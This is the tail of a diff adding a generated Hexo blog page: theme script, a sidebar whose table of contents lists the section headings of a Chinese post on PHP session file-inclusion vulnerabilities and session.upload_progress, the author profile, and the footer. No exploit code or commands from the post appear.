+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-session%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">PHP session包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPHP-session"><span class="nav-number">1.1.</span> <span class="nav-text">什么是PHP session</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-session-%E5%8F%98%E9%87%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">PHP session 变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B-PHP-session"><span class="nav-number">1.1.2.</span> <span class="nav-text">开始 PHP session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8-session-%E5%8F%98%E9%87%8F"><span class="nav-number">1.1.3.</span> <span class="nav-text">存储 session 变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E5%9C%B0%E5%9D%80"><span class="nav-number">1.1.4.</span> <span class="nav-text">session变量存储地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E6%94%BEsession%E5%8F%98%E9%87%8F%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">1.1.5.</span> <span class="nav-text">存放session变量文件名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%80%E6%AF%81-session"><span class="nav-number">1.1.6.</span> <span class="nav-text">销毁 session</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E4%BE%9B%E5%AF%B9session%E8%B5%8B%E5%80%BC%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="nav-number">1.3.1.</span> <span class="nav-text">提供对session赋值的功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%A1%E6%9C%89%E6%8F%90%E4%BE%9B%E8%B5%8B%E5%80%BC%E5%8A%9F%E8%83%BD"><span class="nav-number">1.3.2.</span> <span class="nav-text">没有提供赋值功能</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#session-upload-progress%E5%86%99%E5%85%A5"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">session.upload_progress写入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php%E9%85%8D%E7%BD%AE"><span class="nav-number">1.3.2.1.1.</span> <span class="nav-text">php配置</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%8F%8A%E8%AF%A6%E8%A7%A3%EF%BC%88session-upload-progress-cleanup%E4%B8%BAOff%EF%BC%89"><span class="nav-number">1.3.2.1.2.</span> <span class="nav-text">实例及详解（session.upload_progress.cleanup为Off）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%8F%8A%E8%AF%A6%E8%A7%A3%EF%BC%88session-upload-progress-cleanup%E4%B8%BAOn%EF%BC%89"><span class="nav-number">1.3.2.1.3.</span> <span class="nav-text">实例及详解（session.upload_progress.cleanup为On）</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Apython%E8%84%9A%E6%9C%AC%E5%8C%85%E5%90%ABsession"><span class="nav-number">1.3.2.1.3.1.</span> <span class="nav-text">解法一：python脚本包含session</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Ahtml-%E7%88%86%E7%A0%B4"><span class="nav-number">1.3.2.1.3.2.</span> <span class="nav-text">解法二：html+爆破</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ed3n"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Ed3n</p>
+  <div class="site-description" itemprop="description">欢迎光临，我的朋友</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ed3n</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共31.7k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
